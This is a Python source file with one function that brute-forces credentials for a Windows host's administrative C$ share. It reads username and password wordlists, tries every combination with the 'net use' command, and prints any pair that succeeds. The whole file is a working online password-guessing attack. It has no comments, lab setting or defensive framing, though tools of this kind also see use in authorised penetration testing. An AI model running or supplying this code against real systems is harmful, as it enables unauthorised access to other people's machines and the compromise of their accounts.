import subprocess

def brute_force(ip, userlist, passlist):
    try:
        with open(userlist, 'r', encoding='utf-8') as f:
            usernames = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"[-] Username wordlist not found: {userlist}")
        userlist = input("[?] Enter path to username wordlist: ").strip()
        if not userlist:
            print("[-] No wordlist provided. Exiting.")
            return None, None
        try:
            with open(userlist, 'r', encoding='utf-8') as f:
                usernames = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            print("[-] File not found. Exiting.")
            return None, None
    
    try:
        with open(passlist, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"[-] Password wordlist not found: {passlist}")
        passlist = input("[?] Enter path to password wordlist: ").strip()
        if not passlist:
            print("[-] No wordlist provided. Exiting.")
            return None, None
        try:
            with open(passlist, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            print("[-] File not found. Exiting.")
            return None, None
    
    if not usernames or not passwords:
        print("[-] Wordlists are empty.")
        return None, None
    
    print(f"[+] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
    print(f"[+] Total combinations: {len(usernames) * len(passwords)}")
    
    found = False
    attempt = 0
    total = len(usernames) * len(passwords)
    
    for username in usernames:
        for password in passwords:
            attempt += 1
            print(f"[*] Attempt {attempt}/{total}: {username}:{password}")
            
            result = subprocess.run(
                ['net', 'use', 'Z:', f'\\\\{ip}\\C$', f'/user:{username}', password],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                print(f"\n[+] SUCCESS! Valid credentials found: {username}:{password}")
                subprocess.run(['net', 'use', 'Z:', '/delete'], capture_output=True, text=True)
                return username, password
            
            subprocess.run(['net', 'use', 'Z:', '/delete'], capture_output=True, text=True)
    
    print("\n[-] No valid credentials found.")
    return None, None